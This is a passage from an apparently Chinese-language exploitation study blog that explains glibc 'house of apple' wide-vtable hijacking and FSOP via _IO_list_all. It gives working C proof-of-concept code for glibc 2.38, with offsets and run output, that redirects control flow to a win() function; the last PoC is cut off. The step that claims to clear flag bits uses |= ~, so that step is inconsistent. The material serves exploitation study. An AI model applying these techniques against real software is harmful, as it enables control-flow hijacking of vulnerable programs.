<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_WXSGETN</span><br><span class="line">	WJUMP2</span><br><span class="line">		_IO_WIDE_JUMPS_FUNC</span><br><span class="line">			_IO_WIDE_JUMPS</span><br><span class="line">				_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span><br></pre></td></tr></table></figure>

<p>也就是说劫持<code>_wide_vtable</code>虚表指针是不会被检查的</p>
<p>而<code>_wide_data</code>结构体位于<code>libc</code>的只读内存区中,无法修改其中的<code>_wide_vtable</code>,因此还需要伪造一个<code>_wide_data</code></p>
<p>并且只劫持<code>_wide_vtable</code>还不够,因为正常情况下控制流是绝对不会进入任何一个宽字节相关函数的</p>
<p>所以还需要把<code>_IO_FILE_plus.vtable</code>改成<code>IO_WFILE_JUMPS</code></p>
<p>最后再调用一个<code>fwrite</code></p>
<p>接下来控制流是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	=&gt; vtable+0x38</span><br><span class="line">		=&gt; _IO_wfile_xsputn</span><br><span class="line">			=&gt; _IO_wdefault_xsputn @ glibc/libio/wgenops.c</span><br><span class="line">				=&gt; __woverflow</span><br><span class="line">					=&gt; vtable+0x18</span><br><span class="line">						=&gt; _IO_wfile_overflow</span><br><span class="line">							=&gt; _IO_wdoallocbuf</span><br><span class="line">								=&gt; _IO_WDOALLOCATE (wide_data.wide_vtable+0x68 =&gt; win )</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<p>总的来说,需要干这么几步:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span><br><span class="line">1.构造fake_wide_vtable,在其中填充目标函数(关键是+0x68位置)</span><br><span class="line">2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针吗,指向1中构造的fake_wide_vtable</span><br><span class="line">3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) // ~(0x800 | 0x8 | 0x2)</span><br><span class="line">4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span><br><span class="line">5.修改FILE._wide_data指向2中构造的fake_wide_data</span><br><span class="line">6.fwrite触发house of apple</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里复位了三个<code>flag</code>,各自的作用是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>		<span class="comment">//2.必须有写权限</span></span><br><span class="line"> &#123;</span><br><span class="line">   f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">   __set_errno (EBADF);</span><br><span class="line">   <span class="keyword">return</span> WEOF;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>		<span class="comment">//1.不能是_IO_CURRENTLY_PUTTING,这样就会进入本if从而调用到_IO_wdoallocbuf</span></span><br><span class="line">   || f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">   <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))		<span class="comment">//_IO_UNBUFFERED必须等于0才会进入本if,调用到_IO_WDOALLOCATE</span></span><br><span class="line"> <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>写个poc意思意思</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">100</span>,fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基于<code>glibc2.38</code>做实验,<code>win</code>函数被调用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc apple.c -o apple -g -no-pie -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./apple</span><br><span class="line">function printf @ 0x7f7e72eba110</span><br><span class="line">_IO_wfile_jumps @ 0x7f7e7303b268</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>







<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>上集说到,<code>house of apple</code>在构造好了<code>FILE</code>之后,还要对其进行一个<code>fwrite</code>等操作触发到<code>_IO_wfile_overflow</code>函数</p>
<p>在本集中,<strong>不需要</strong>调用<code>fwrite</code>等操作,也可以触发,相关攻击方式叫做<code>FSOP(File Structure Oriented Programming)</code></p>
<p>程序退出时,会有这么一条调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + 0x18 =&gt; _IO_file_overflow</span><br></pre></td></tr></table></figure>

<p>这个<code>_IO_flush_all</code>中会把<code>_IO_list_all</code>上挂着的都尝试一下<code>_IO_OVERFLOW</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     run_fp = fp;</span><br><span class="line">     _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">     _IO_funlockfile (fp);</span><br><span class="line">     run_fp = <span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里能够执行<code>_IO_OVERFLOW</code>的条件是下式为真</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) </span><br><span class="line">|| </span><br><span class="line">(</span><br><span class="line">    _IO_vtable_offset(fp) == <span class="number">0</span> </span><br><span class="line">    &amp;&amp;</span><br><span class="line">    fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">    &amp;&amp; </span><br><span class="line">    (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>翻译成人话就是下面两条<strong>有一条为真</strong>即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.如果fp-&gt;_mode&lt;=0,还需要满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">2.如果fp-&gt;_mode&gt; 0,还需要满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>



<p>如果能够使用<code>house of apple</code>的方法,</p>
<p><strong>使得的<code>vtable</code>指向<code>_IO_wfile_jumps</code>,然后构造<code>wide_data</code>,并使其<code>wide_vtable</code>指向假的虚表,假表相应位置填充<code>win</code>函数地址</strong></p>
<p><strong>然后将这个FILE挂到<code>_IO_list_all</code>链上</strong></p>
<p>就可以调用到<code>win</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + <span class="number">0x18</span> =&gt; _IO_wfile_overflow</span><br><span class="line">						_IO_wdoallocbuf</span><br><span class="line">							_IO_WDOALLOCATE</span><br><span class="line">    							wide_data.wide_vtable  + <span class="number">0x68</span> =&gt; win</span><br></pre></td></tr></table></figure>

<p>写一个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fake_fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="comment">//泄露libc基址,泄露IO_wfile_jumps地址,泄露IO_list_all地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_list_all_addr = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d74c0</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_list_all_addr = %p\n&quot;</span>, IO_list_all_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.</span></span><br><span class="line">    <span class="comment">//构造fake_fp</span></span><br><span class="line">    fake_fp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_fp,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    fake_fp -&gt; _flags =  ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>); </span><br><span class="line">    fake_fp -&gt; _mode = <span class="number">0</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_fp @ %p\n&quot;</span>, fake_fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;orignal _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//5.fake_fp上链_IO_list_all</span></span><br><span class="line">    *IO_list_all_addr = fake_fp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.</span></span><br><span class="line">    <span class="comment">//return and trigger win</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop1.c -o fsop1 -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop1</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7fb0bbddc110</span><br><span class="line">libc_addr = 0x7fb0bbd88000</span><br><span class="line">IO_list_all_addr = 0x7fb0bbf5f4c0</span><br><span class="line">IO_wfile_jumps = 0x7fb0bbf5d268</span><br><span class="line">fake_fp @ 0x55fbae0cc8d0</span><br><span class="line">orignal _IO_list_all points to 0x7fb0bbf5f4e0</span><br><span class="line">new _IO_list_all points to 0x55fbae0cc8d0</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>



<p>如果能够控制<code>fopen</code>并且不<code>fclose</code>关闭资源则更简单,</p>
<p><code>fopen</code>会自动让假<code>fp</code>上链,</p>
<p>不<code>fclose</code>的话<code>fp</code>就不会下链,</p>
<p>因此此时程序退出,也可以触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.泄露libc基地址,泄露IO_wfile_jumps地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span 